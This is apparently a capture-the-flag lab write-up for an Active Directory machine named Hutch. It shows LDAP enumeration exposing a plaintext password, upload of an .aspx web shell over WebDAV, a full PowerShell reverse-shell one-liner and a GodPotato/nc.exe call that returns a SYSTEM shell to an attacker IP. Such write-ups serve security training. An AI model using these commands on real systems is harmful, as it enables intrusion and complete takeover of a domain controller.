##### Tags: `Webdav`  `cadaver`  `ldap`  `Kerberoasting`  `SeImpersonatePrivilege`  `.aspx` 

# 🪟 Hutch (AD)🪟
## Enumeration
Nmap
```console
$ nmap -sC -sV 192.168.119.122    

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Tue, 14 Apr 2026 10:13:23 GMT
|_  Server Type: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-14 10:13:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
port 80 is running webdav and we can upload files but we need username and password  
we know the domain name of this machine is hutch.offsec from the namp scan  
we can do lapsearch for any users
```console
$ ldapsearch -x -H ldap://192.168.119.122 -b "DC=hutch,DC=offsec"

# Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request. Please c
 hange on next login.
distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20210216133934.0Z
uSNCreated: 12831
uSNChanged: 49179
name: Freddy McSorley
objectGUID:: TxilGIhMVkuei6KplCd8ug==
userAccountControl: 66048
badPwdCount: 29
codePage: 0
countryCode: 0
badPasswordTime: 134206361215225605
lastLogoff: 0
lastLogon: 132579563744834908
pwdLastSet: 132489417058152751
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: fmcsorley
sAMAccountType: 805306368
userPrincipalName: fmcsorley@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 132579563744834908
msDS-SupportedEncryptionTypes: 0

```
we found the username fmcsorley and password CrabSharkJellyfish192  
we use those credential login to cadaver
```console
$ cadaver http://192.168.119.122
Authentication required for 192.168.119.122 on server `192.168.119.122':
Username: fmcsorley
Password: CrabSharkJellyfish192
dav:/> ls
Listing collection `/': succeeded.
Coll:   aspnet_client                          0  Nov  4  2020
        iisstart.htm                         703  Nov  4  2020
        iisstart.png                       99710  Nov  4  2020
        index.aspx                          1241  Nov  5  2020
```
this directory is for what port 80 is running  
we have upload permission so we will upload a .aspx cmd shell
```console
https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/FuzzDB/cmd.aspx
```
upload it
```console
dav:/> put shell.aspx
Uploading shell.aspx to `/shell.aspx':
Progress: [=============================>] 100.0% of 1400 bytes succeeded.
```
then we go to http://192.168.119.122/shell.aspx
```console
whoami
iis apppool\defaultapppool
```
confirmed we have RCE  
but unable to upload nc.exe  
so i use powershell reverse shell script
```console
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.218',389);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
got the shell back
```console
$ penelope -p 389
[+] Listening for reverse shells on 0.0.0.0:389 →  127.0.0.1 • 10.0.2.15 • 192.168.45.218
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from HUTCHDC 192.168.119.122 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 iis apppool\defaultapppool • Assigned SessionID <1>                                                                       
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/HUTCHDC~192.168.119.122-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_04_14-21_27_04-311.log                                                                                
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\> whoami
iis apppool\defaultapppool
```
## Privilege Escalation
we have SeImpersonatePrivilege
```console
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
upload godpotato and nc.exe to abuse this function
```console
PS C:\Users\Public\Documents> ./GodPotato-NET4.exe -cmd "C:\Users\Public\Documents\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.218 139"
```
got system shell
```console
$ nc -lvnp 139
listening on [any] 139 ...
connect to [192.168.45.218] from (UNKNOWN) [192.168.119.122] 62511
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Public\Documents>whoami
nt authority\system
```
